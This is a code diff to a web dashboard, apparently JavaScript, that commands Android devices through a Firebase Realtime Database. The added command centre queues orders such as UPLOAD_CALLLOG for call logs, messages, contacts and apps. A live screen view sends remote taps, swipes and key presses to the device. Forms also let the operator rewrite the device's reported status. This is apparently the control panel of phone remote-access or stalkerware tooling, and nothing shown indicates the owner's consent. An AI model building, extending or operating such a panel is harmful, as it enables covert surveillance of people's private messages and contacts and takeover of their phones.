+                  type="button"
+                  data-send-upload-cmd="${esc(p.cmd)}"
+                  data-upload-target="${esc(p.target)}"
+                  class="p-2.5 rounded-xl bg-[#040a07] border border-emerald-500/25 hover:border-emerald-400/60 hover:bg-emerald-500/10 text-left transition-colors cursor-pointer"
+                >
+                  <p class="text-xs font-semibold text-emerald-200 truncate">${esc(p.label)}</p>
+                  <p class="text-[10px] font-mono-tabular text-emerald-400/80 truncate mt-0.5">${esc(p.cmd)}</p>
+                  <p class="text-[10px] text-slate-500 truncate mt-0.5">${esc(p.desc)}</p>
+                </button>
+              `
+              )
+              .join('')}
+          </div>
+        </div>
+
+        <div class="p-3.5 rounded-2xl bg-[#07130e] border border-emerald-500/20 space-y-2.5">
+          <p class="text-xs font-mono-tabular font-semibold text-emerald-300">&gt; SEND_CUSTOM_COMMAND</p>
+          <form id="form-send-command" class="space-y-2.5">
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-2">
+              <div>
+                <label class="block text-[11px] text-slate-400 mb-1">Command Action</label>
+                <input
+                  name="command"
+                  type="text"
+                  maxlength="64"
+                  required
+                  placeholder="e.g. UPLOAD_CALLLOG"
+                  class="w-full h-9 px-2.5 text-xs font-mono-tabular bg-[#040a07] border border-slate-800 rounded-lg text-white"
+                />
+              </div>
+              <div>
+                <label class="block text-[11px] text-slate-400 mb-1">Target List / Node</label>
+                <select name="target" class="w-full h-9 px-2.5 text-xs font-mono-tabular bg-[#040a07] border border-slate-800 rounded-lg text-white">
+                  <option value="all">all</option>
+                  <option value="calllog">calllog</option>
+                  <option value="messages">messages</option>
+                  <option value="contacts">contacts</option>
+                  <option value="apps">apps</option>
+                  <option value="status">status</option>
+                  <option value="custom">custom</option>
+                </select>
+              </div>
+            </div>
+            <div>
+              <label class="block text-[11px] text-slate-400 mb-1">Payload / Parameters (optional)</label>
+              <input
+                name="payload"
+                type="text"
+                maxlength="500"
+                placeholder='e.g. {"limit":50} or force=true'
+                class="w-full h-9 px-2.5 text-xs font-mono-tabular bg-[#040a07] border border-slate-800 rounded-lg text-white"
+              />
+            </div>
+            <button type="submit" class="w-full h-10 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-mono-tabular font-semibold cursor-pointer">
+              Send Command to RTDB
+            </button>
+          </form>
+        </div>
+
+        <div class="p-3.5 rounded-2xl bg-[#07130e] border border-emerald-500/20 space-y-2.5">
+          <p class="text-xs font-mono-tabular font-semibold text-emerald-300">&gt; COMMAND_QUEUE (${state.commands.length})</p>
+          ${state.commands.length === 0 ? `
+            <p class="text-xs text-slate-400 py-3 text-center font-mono-tabular">No commands queued under ${esc(devicePath(state.activeUid, 'commands'))}.</p>
+          ` : `
+            <div class="space-y-2">
+              ${state.commands
+                .map((cmd) => {
+                  const badgeCls =
+                    cmd.status === 'executed' || cmd.status === 'done' || cmd.status === 'completed'
+                      ? 'bg-emerald-500/15 text-emerald-300 border-emerald-500/30'
+                      : cmd.status === 'failed' || cmd.status === 'error'
+                        ? 'bg-red-500/15 text-red-300 border-red-500/30'
+                        : 'bg-amber-500/15 text-amber-300 border-amber-500/30';
+                  const nextStatus = cmd.status === 'pending' ? 'executed' : 'pending';
+                  return `
+                    <div class="p-2.5 rounded-xl bg-[#040a07] border border-emerald-500/15 flex items-start justify-between gap-2">
+                      <div class="min-w-0">
+                        <div class="flex items-center gap-2 flex-wrap">
+                          <span class="text-xs font-mono-tabular font-semibold text-white">${esc(cmd.command)}</span>
+                          <span class="px-1.5 py-0.5 text-[10px] font-mono-tabular rounded border ${badgeCls}">${esc(cmd.status)}</span>
+                          <span class="text-[10px] font-mono-tabular text-slate-400">target:${esc(cmd.target)}</span>
+                        </div>
+                        ${cmd.payload ? `<p class="text-[11px] font-mono-tabular text-slate-400 mt-1 break-all">${esc(cmd.payload)}</p>` : ''}
+                        <p class="text-[10px] font-mono-tabular text-slate-500 mt-1">${esc(cmd.timestampLabel)} · ${esc(cmd.id)}</p>
+                      </div>
+                      <div class="flex items-center gap-1 shrink-0">
+                        <button
+                          type="button"
+                          data-toggle-cmd-status="${esc(cmd.id)}"
+                          data-next-cmd-status="${esc(nextStatus)}"
+                          class="px-2 py-1 text-[10px] font-mono-tabular rounded bg-slate-800 hover:bg-slate-700 text-emerald-300 cursor-pointer"
+                        >
+                          ${cmd.status === 'pending' ? 'Mark Done' : 'Requeue'}
+                        </button>
+                        <button
+                          type="button"
+                          data-delete-cmd="${esc(cmd.id)}"
+                          class="px-2 py-1 text-xs text-slate-400 hover:text-red-400 cursor-pointer"
+                          aria-label="Delete command"
+                        >
+                          ×
+                        </button>
+                      </div>
+                    </div>
+                  `;
+                })
+                .join('')}
+            </div>
+          `}
+        </div>
+      </div>
+    </div>
+  `;
+}
+
 function renderSettingsScreen() {
   const s = state.status;
   if (!s) {
@@ -1453,54 +2097,120 @@ function renderSettingsScreen() {
   const storagePct = Math.min(100, Math.round((s.storageUsedGb / Math.max(1, s.storageTotalGb)) * 100));
   const ramPct = Math.min(100, Math.round((s.ramUsedGb / Math.max(1, s.ramTotalGb)) * 100));
   const batt = Math.round(Number(s.batteryLevel) || 0);
+  const netOptions = ['5G', '4G', 'Wi-Fi', '3G', 'Offline'];
 
   return `
     <div class="min-h-full bg-[#040a07] flex flex-col">
-      <div class="sticky top-0 z-10 bg-[#040a07]/95 backdrop-blur-md px-4 py-3 border-b border-slate-800">
-        <h2 class="text-sm font-bold text-white">System &amp; Battery</h2>
-        <p class="text-[11px] font-mono-tabular text-slate-400">${esc(devicePath(state.activeUid, 'status'))}</p>
+      <div class="sticky top-0 z-10 bg-[#040a07]/95 backdrop-blur-md px-4 py-3 border-b border-slate-800 flex items-center justify-between gap-2">
+        <div>
+          <h2 class="text-sm font-bold text-white">Status Update System</h2>
+          <p class="text-[11px] font-mono-tabular text-slate-400">${esc(devicePath(state.activeUid, 'status'))}</p>
+        </div>
+        <button
+          type="button"
+          data-send-upload-cmd="UPLOAD_STATUS"
+          data-upload-target="status"
+          class="px-2.5 py-1.5 text-[11px] font-mono-tabular font-semibold bg-emerald-500/15 border border-emerald-500/35 text-emerald-300 hover:bg-emerald-500/25 rounded-lg cursor-pointer shrink-0"
+        >
+          ↑ Sync Status Cmd
+        </button>
       </div>
 
       <div class="p-4 space-y-4">
         <div class="p-3.5 rounded-2xl bg-[#07130e] border border-emerald-500/20 space-y-2.5">
-          <div class="flex items-center justify-between">
-            <span class="text-xs font-semibold text-white">Battery Status</span>
-            <span class="text-base font-bold font-mono-tabular ${s.isCharging ? 'text-emerald-400' : batt <= 20 ? 'text-amber-400' : 'text-white'}">${batt}%</span>
+          <div class="flex items-center justify-between gap-2">
+            <div>
+              <p class="text-xs font-semibold text-white">Live Presence &amp; Heartbeat</p>
+              <p class="text-[11px] font-mono-tabular text-slate-400 mt-0.5">
+                Last Seen: ${s.lastSeen ? esc(new Date(Number(s.lastSeen)).toLocaleString()) : '—'}
+              </p>
+            </div>
+            <button
+              type="button"
+              data-action="phone-toggle-online"
+              class="px-3 py-1.5 rounded-lg text-xs font-mono-tabular font-semibold cursor-pointer ${s.online ? 'bg-emerald-600 text-white' : 'bg-slate-800 text-slate-300'}"
+            >
+              ${s.online ? '● Online' : '○ Offline'}
+            </button>
           </div>
-          <div class="w-full h-2 rounded-full bg-slate-800 overflow-hidden">
-            <div class="h-full ${s.isCharging ? 'bg-emerald-500' : batt <= 20 ? 'bg-amber-500' : 'bg-blue-500'}" style="width:${batt}%"></div>
-          </div>
-          <div class="flex items-center justify-between text-[11px] text-slate-400">
-            <span>${s.isCharging ? 'Charging via USB-C' : 'Discharging'} · <span class="font-mono-tabular">${esc(s.temperatureC)}°C</span></span>
-            <button type="button" data-action="phone-toggle-charging" class="text-blue-400 hover:text-blue-300 font-medium cursor-pointer">
-              ${s.isCharging ? 'Unplug' : 'Plug In'}
+          <div class="flex items-center gap-2 pt-1">
+            <button
+              type="button"
+              data-action="phone-ping-lastseen"
+              class="flex-1 h-8 text-[11px] font-mono-tabular font-medium bg-[#040a07] border border-emerald-500/30 text-emerald-300 hover:bg-emerald-500/15 rounded-lg cursor-pointer"
+            >
+              Update Last Seen (Now)
+            </button>
+            <button
+              type="button"
+              data-nav="commands"
+              class="px-3 h-8 text-[11px] font-mono-tabular font-medium bg-[#040a07] border border-slate-700 text-slate-200 hover:border-emerald-400/50 rounded-lg cursor-pointer"
+            >
+              Command Center →
             </button>
           </div>
         </div>
 
         <div class="p-3.5 rounded-2xl bg-[#07130e] border border-emerald-500/20 space-y-2.5">
-          <p class="text-xs font-semibold text-white">Device Identity</p>
-          <form id="form-phone-device-name" class="flex gap-2">
-            <input
-              name="deviceName"
-              type="text"
-              maxlength="64"
-              value="${esc(s.deviceName)}"
-              class="flex-1 h-9 px-2.5 text-xs bg-[#040a07] border border-slate-800 rounded-lg text-white"
-            />
-            <button type="submit" class="px-3 h-9 text-xs font-semibold bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg cursor-pointer">Rename</button>
-          </form>
-          <div class="text-[11px] text-slate-400 space-y-1 pt-1">
-            <div class="flex justify-between"><span>Status</span><span class="${s.online ? 'text-emerald-400' : 'text-slate-400'} font-mono-tabular">${s.online ? 'Online' : 'Offline'}</span></div>
-            <div class="flex justify-between"><span>Last Seen</span><span class="text-slate-200 font-mono-tabular">${s.lastSeen ? esc(new Date(Number(s.lastSeen)).toLocaleString()) : '—'}</span></div>
-            <div class="flex justify-between"><span>Model</span><span class="text-slate-200">${esc(s.model)}</span></div>
-            <div class="flex justify-between"><span>OS Version</span><span class="text-slate-200 font-mono-tabular">${esc(s.osVersion)}</span></div>
-            <div class="flex justify-between gap-3"><span>Device UID</span><span class="text-slate-200 font-mono-tabular truncate">${esc(state.activeUid)}</span></div>
+          <div class="flex items-center justify-between">
+            <span class="text-xs font-semibold text-white">Battery &amp; Power</span>
+            <span class="text-base font-bold font-mono-tabular ${s.isCharging ? 'text-emerald-400' : batt <= 20 ? 'text-amber-400' : 'text-white'}">${batt}%</span>
+          </div>
+          <input
+            id="input-status-battery-range"
+            type="range"
+            min="0"
+            max="100"
+            value="${batt}"
+            class="w-full accent-emerald-500 cursor-pointer"
+          />
+          <div class="flex items-center justify-between text-[11px] text-slate-400 gap-2">
+            <span>${s.isCharging ? 'Charging via USB-C' : 'Discharging'} · <span class="font-mono-tabular">${esc(s.temperatureC)}°C</span></span>
+            <div class="flex items-center gap-1.5">
+              <button type="button" data-step-battery="-10" class="px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-200 font-mono-tabular cursor-pointer">-10%</button>
+              <button type="button" data-step-battery="10" class="px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-200 font-mono-tabular cursor-pointer">+10%</button>
+              <button type="button" data-action="phone-toggle-charging" class="px-2 py-1 rounded bg-emerald-500/15 border border-emerald-500/30 text-emerald-300 hover:bg-emerald-500/25 font-medium cursor-pointer">
+                ${s.isCharging ? 'Unplug' : 'Plug In'}
+              </button>
+            </div>
           </div>
         </div>
 
-        <div class="p-3.5 rounded-2xl bg-[#07130e] border border-emerald-500/20 space-y-2">
-          <p class="text-xs font-semibold text-white">Radio &amp; Connectivity</p>
+        <div class="p-3.5 rounded-2xl bg-[#07130e] border border-emerald-500/20 space-y-2.5">
+          <p class="text-xs font-semibold text-white">Radio &amp; Network Status</p>
+          <div class="flex flex-wrap gap-1.5">
+            ${netOptions
+              .map(
+                (netOpt) => `
+                <button
+                  type="button"
+                  data-set-network="${esc(netOpt)}"
+                  class="px-2.5 py-1 rounded-md text-[11px] font-mono-tabular font-medium cursor-pointer ${s.networkType === netOpt ? 'bg-emerald-600 text-white' : 'bg-[#040a07] border border-slate-800 text-slate-400 hover:text-white'}"
+                >
+                  ${esc(netOpt)}
+                </button>
+              `
+              )
+              .join('')}
+          </div>
+          <div class="flex items-center justify-between pt-1 text-xs">
+            <span class="text-slate-300">Signal Bars</span>
+            <div class="flex items-center gap-1">
+              ${[0, 1, 2, 3, 4]
+                .map(
+                  (bars) => `
+                  <button
+                    type="button"
+                    data-set-signal="${bars}"
+                    class="w-6 h-6 rounded text-[11px] font-mono-tabular cursor-pointer ${Number(s.signalStrength) === bars ? 'bg-emerald-600 text-white' : 'bg-slate-800 text-slate-400 hover:text-white'}"
+                  >
+                    ${bars}
+                  </button>
+                `
+                )
+                .join('')}
+            </div>
+          </div>
           <div class="flex items-center justify-between py-1 text-xs">
             <span class="text-slate-300">Wi-Fi (${esc(s.wifiName || 'None')})</span>
             <button type="button" data-action="phone-toggle-wifi" class="px-2.5 py-1 rounded-md text-[11px] font-medium cursor-pointer ${s.wifiConnected ? 'bg-emerald-600 text-white' : 'bg-slate-800 text-slate-400'}">
@@ -1515,8 +2225,56 @@ function renderSettingsScreen() {
           </div>
         </div>
 
+        <div class="p-3.5 rounded-2xl bg-[#07130e] border border-emerald-500/20 space-y-2.5">
+          <div class="flex items-center justify-between">
+            <p class="text-xs font-semibold text-white">Edit Device Status Fields</p>
+            <span class="text-[10px] font-mono-tabular text-slate-400 truncate">UID: ${esc(state.activeUid)}</span>
+          </div>
+          <form id="form-status-update" class="space-y-2.5">
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-2">
+              <div>
+                <label class="block text-[11px] text-slate-400 mb-1">Device Name</label>
+                <input name="deviceName" type="text" maxlength="64" value="${esc(s.deviceName)}" class="w-full h-9 px-2.5 text-xs bg-[#040a07] border border-slate-800 rounded-lg text-white" />
+              </div>
+              <div>
+                <label class="block text-[11px] text-slate-400 mb-1">Model</label>
+                <input name="model" type="text" maxlength="64" value="${esc(s.model)}" class="w-full h-9 px-2.5 text-xs bg-[#040a07] border border-slate-800 rounded-lg text-white" />
+              </div>
+              <div>
+                <label class="block text-[11px] text-slate-400 mb-1">OS Version</label>
+                <input name="osVersion" type="text" maxlength="32" value="${esc(s.osVersion)}" class="w-full h-9 px-2.5 text-xs font-mono-tabular bg-[#040a07] border border-slate-800 rounded-lg text-white" />
+              </div>
+              <div>
+                <label class="block text-[11px] text-slate-400 mb-1">Wi-Fi SSID</label>
+                <input name="wifiName" type="text" maxlength="64" value="${esc(s.wifiName)}" class="w-full h-9 px-2.5 text-xs bg-[#040a07] border border-slate-800 rounded-lg text-white" />
+              </div>
+              <div>
+                <label class="block text-[11px] text-slate-400 mb-1">Temp (°C)</label>
+                <input name="temperatureC" type="number" step="0.1" min="-20" max="120" value="${esc(s.temperatureC)}" class="w-full h-9 px-2.5 text-xs font-mono-tabular bg-[#040a07] border border-slate-800 rounded-lg text-white" />
+              </div>
+              <div>
+                <label class="block text-[11px] text-slate-400 mb-1">Storage Used / Total (GB)</label>
+                <div class="grid grid-cols-2 gap-1.5">
+                  <input name="storageUsedGb" type="number" step="0.1" min="0" max="4096" value="${esc(s.storageUsedGb)}" class="w-full h-9 px-2 text-xs font-mono-tabular bg-[#040a07] border border-slate-800 rounded-lg text-white" />
+                  <input name="storageTotalGb" type="number" step="1" min="1" max="4096" value="${esc(s.storageTotalGb)}" class="w-full h-9 px-2 text-xs font-mono-tabular bg-[#040a07] border border-slate-800 rounded-lg text-white" />
+                </div>
+              </div>
+              <div class="sm:col-span-2">
+                <label class="block text-[11px] text-slate-400 mb-1">RAM Used / Total (GB)</label>
+                <div class="grid grid-cols-2 gap-2">
+                  <input name="ramUsedGb" type="number" step="0.1" min="0" max="256" value="${esc(s.ramUsedGb)}" class="w-full h-9 px-2.5 text-xs font-mono-tabular bg-[#040a07] border border-slate-800 rounded-lg text-white" />
+                  <input name="ramTotalGb" type="number" step="1" min="1" max="256" value="${esc(s.ramTotalGb)}" class="w-full h-9 px-2.5 text-xs font-mono-tabular bg-[#040a07] border border-slate-800 rounded-lg text-white" />
+                </div>
+              </div>
+            </div>
+            <button type="submit" class="w-full h-10 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-mono-tabular font-semibold cursor-pointer">
+              Save Status Update to RTDB
+            </button>
+          </form>
+        </div>
+
         <div class="p-3.5 rounded-2xl bg-[#07130e] border border-emerald-500/20 space-y-3">
-          <p class="text-xs font-semibold text-white">Storage &amp; Memory</p>
+          <p class="text-xs font-semibold text-white">Storage &amp; Memory Usage</p>
           <div>
             <div class="flex justify-between text-[11px] text-slate-400 mb-1">
               <span>Internal Storage</span>
@@ -1560,6 +2318,10 @@ function renderPhoneScreen() {
     viewport.innerHTML = renderContactsScreen();
   } else if (state.screen === 'apps') {
     viewport.innerHTML = renderAppsScreen();
+  } else if (state.screen === 'commands') {
+    viewport.innerHTML = renderCommandsScreen();
+  } else if (state.screen === 'screen') {
+    viewport.innerHTML = renderLiveScreenView();
   } else if (state.screen === 'settings') {
     viewport.innerHTML = renderSettingsScreen();
   }
@@ -1619,6 +2381,29 @@ function renderDeviceOverviewAndInspector() {
     jsonEl.textContent = state.activeUid
       ? JSON.stringify(state.status || {}, null, 2)
       : 'Select a device UID to inspect Realtime Database nodes.';
+  } else if (tab === 'screen') {
+    pathEl.textContent = `${uidDisplay}/screen`;
+    if (!state.activeUid) {
+      jsonEl.textContent = 'Select a device UID to inspect Realtime Database nodes.';
+    } else if (!state.screenData) {
+      jsonEl.textContent = 'null';
+    } else {
+      jsonEl.textContent = JSON.stringify(
+        {
+          ...state.screenData,
+          imageSrc: state.screenData.imageSrc
+            ? `${state.screenData.imageSrc.slice(0, 96)}... (${state.screenData.imageSrc.length} chars)`
+            : '',
+        },
+        null,
+        2
+      );
+    }
+  } else if (tab === 'screenControl') {
+    pathEl.textContent = `${uidDisplay}/screenControl`;
+    jsonEl.textContent = state.activeUid
+      ? JSON.stringify(state.screenControl || {}, null, 2)
+      : 'Select a device UID to inspect Realtime Database nodes.';
   } else {
     pathEl.textContent = `${uidDisplay}/${tab}`;
     const listMap = {
@@ -1626,6 +2411,7 @@ function renderDeviceOverviewAndInspector() {
       messages: state.messages,
       contacts: state.contacts,
       apps: state.apps,
+      commands: state.commands,
     };
     jsonEl.textContent = state.activeUid
       ? JSON.stringify(listMap[tab] || [], null, 2)
@@ -1709,6 +2495,12 @@ function wireStaticListeners() {
   });
   document.getElementById('shade-open-settings')?.addEventListener('click', () => {
     navigateTo('settings');
+  });
+  document.getElementById('shade-open-screen')?.addEventListener('click', () => {
+    navigateTo('screen');
+  });
+  document.getElementById('shade-open-commands')?.addEventListener('click', () => {
+    navigateTo('commands');
   });
 
   // Hardware buttons
@@ -1818,6 +2610,68 @@ function wireStaticListeners() {
         if (!state.status) return;
         return updateDeviceStatusFields({ bluetoothOn: !state.status.bluetoothOn });
       }
+      if (action === 'phone-toggle-online') {
+        if (!state.status) return;
+        return updateDeviceStatusFields({ online: !state.status.online, lastSeen: Date.now() });
+      }
+      if (action === 'phone-ping-lastseen') {
+        if (!state.status) return;
+        await updateDeviceStatusFields({ online: true, lastSeen: Date.now() });
+        showPhoneToast('Status Updated', 'Online & lastSeen synced');
+        return;
+      }
+      if (action === 'clear-all-commands') {
+        return clearAllCommands();
+      }
+
+      const uploadCmd = target.getAttribute('data-send-upload-cmd');
+      if (uploadCmd) {
+        const uploadTarget = target.getAttribute('data-upload-target') || 'all';
+        return sendDeviceCommand({ command: uploadCmd, target: uploadTarget });
+      }
+
+      const toggleCmdId = target.getAttribute('data-toggle-cmd-status');
+      if (toggleCmdId) {
+        const nextStatus = target.getAttribute('data-next-cmd-status') || 'executed';
+        return updateCommandStatus(toggleCmdId, nextStatus);
+      }
+
+      const deleteCmdId = target.getAttribute('data-delete-cmd');
+      if (deleteCmdId) {
+        return deleteCommandEntry(deleteCmdId);
+      }
+
+      const stepBattery = target.getAttribute('data-step-battery');
+      if (stepBattery !== null) {
+        if (!state.status) return;
+        const delta = Number(stepBattery) || 0;
+        const next = Math.max(0, Math.min(100, Math.round(state.status.batteryLevel) + delta));
+        return updateDeviceStatusFields({ batteryLevel: next });
+      }
+
+      const setNetwork = target.getAttribute('data-set-network');
+      if (setNetwork) {
+        if (!state.status) return;
+        return updateDeviceStatusFields({ networkType: setNetwork });
+      }
+
+      const setSignal = target.getAttribute('data-set-signal');
+      if (setSignal !== null) {
+        if (!state.status) return;
+        const nextSig = Math.max(0, Math.min(4, Number(setSignal) || 0));
+        return updateDeviceStatusFields({ signalStrength: nextSig });
+      }
+
+      const screenMode = target.getAttribute('data-screen-mode');
+      if (screenMode) {
+        state.screenControlMode = screenMode === 'swipe' ? 'swipe' : 'tap';
+        return renderPhoneScreen();
+      }
+
+      const screenKey = target.getAttribute('data-screen-key');
+      if (screenKey) {
+        return sendScreenTapControl({ action: 'key', key: screenKey });
+      }
 
       const nav = target.getAttribute('data-nav');
       if (nav) return navigateTo(nav);
@@ -1912,6 +2766,72 @@ function wireStaticListeners() {
       }
     });
 
+    let screenPointerStart = null;
+
+    viewport.addEventListener('pointerdown', (e) => {
+      const stage = e.target.closest('#remote-screen-stage');
+      if (!stage || !state.activeUid) return;
+      const rect = stage.getBoundingClientRect();
+      if (!rect.width || !rect.height) return;
+      screenPointerStart = {
+        clientX: e.clientX,
+        clientY: e.clientY,
+        rect,
+      };
+    });
+
+    viewport.addEventListener('pointerup', async (e) => {
+      if (!screenPointerStart) return;
+      const start = screenPointerStart;
+      screenPointerStart = null;
+
+      const stage = document.getElementById('remote-screen-stage');
+      if (!stage || !state.activeUid) return;
+      const rect = stage.getBoundingClientRect();
+      if (!rect.width || !rect.height) return;
+
+      const img = document.getElementById('remote-screen-image');
+      const targetWidth = state.screenData?.width || img?.naturalWidth || 1080;
+      const targetHeight = state.screenData?.height || img?.naturalHeight || 2400;
+
+      const clamp01 = (v) => Math.max(0, Math.min(1, v));
+      const startXPct = clamp01((start.clientX - rect.left) / rect.width);
+      const startYPct = clamp01((start.clientY - rect.top) / rect.height);
+      const endXPct = clamp01((e.clientX - rect.left) / rect.width);
+      const endYPct = clamp01((e.clientY - rect.top) / rect.height);
+
+      const dx = e.clientX - start.clientX;
+      const dy = e.clientY - start.clientY;
+      const dist = Math.hypot(dx, dy);
+
+      if (state.screenControlMode === 'swipe' || dist > 24) {
+        await sendScreenTapControl({
+          action: 'swipe',
+          startX: startXPct * targetWidth,
+          startY: startYPct * targetHeight,
+          endX: endXPct * targetWidth,
+          endY: endYPct * targetHeight,
+          width: targetWidth,
+          height: targetHeight,
+        });
+      } else {
+        await sendScreenTapControl({
+          action: 'tap',
+          x: endXPct * targetWidth,
+          y: endYPct * targetHeight,
+          xPercent: endXPct,
+          yPercent: endYPct,
+          width: targetWidth,
+          height: targetHeight,
+        });
+      }
+      renderPhoneScreen();
+    });
+
+    viewport.addEventListener('pointercancel', () => {
+      screenPointerStart = null;
+    });
+
     viewport.addEventListener('input', (e) => {
       const target = e.target;
       if (target.id === 'dialer-input') {
@@ -1922,6 +2842,15 @@ function wireStaticListeners() {
       } else if (target.id === 'input-app-search') {
         state.appSearch = target.value;
         renderPhoneScreen();
+      }
+    });
+
+    viewport.addEventListener('change', async (e) => {
+      const target = e.target;
+      if (target.id === 'input-status-battery-range' && state.status) {
+        const next = Math.max(0, Math.min(100, Math.round(Number(target.value) || 0)));
+        await updateDeviceStatusFields({ batteryLevel: next });
+        showPhoneToast('Battery Updated', `${next}%`);
       }
     });
 
@@ -1975,6 +2904,30 @@ function wireStaticListeners() {
       } else if (form.id === 'form-phone-device-name') {
         const data = new FormData(form);
         await saveDeviceName(data.get('deviceName'));
+      } else if (form.id === 'form-send-command') {
+        const data = new FormData(form);
+        await sendDeviceCommand({
+          command: data.get('command'),
+          target: data.get('target'),
+          payload: data.get('payload'),
+        });
+        form.reset();
+      } else if (form.id === 'form-status-update') {
+        const data = new FormData(form);
+        const fields = {
+          deviceName: cleanText(data.get('deviceName'), 64) || state.activeUid,
+          model: cleanText(data.get('model'), 64) || 'Android Device',
+          osVersion: cleanText(data.get('osVersion'), 32) || 'Android 15',
+          wifiName: cleanText(data.get('wifiName'), 64) || 'Wi-Fi',
+          temperatureC: Number(data.get('temperatureC')) || 31.4,
+          storageUsedGb: Math.max(0, Number(data.get('storageUsedGb')) || 0),
+          storageTotalGb: Math.max(1, Number(data.get('storageTotalGb')) || 128),
+          ramUsedGb: Math.max(0, Number(data.get('ramUsedGb')) || 0),
+          ramTotalGb: Math.max(1, Number(data.get('ramTotalGb')) || 12),
+          lastSeen: Date.now(),
+        };
+        await updateDeviceStatusFields(fields);
+        showPhoneToast('Status Saved', `${fields.deviceName} synced to RTDB`);
       }
     });
   }
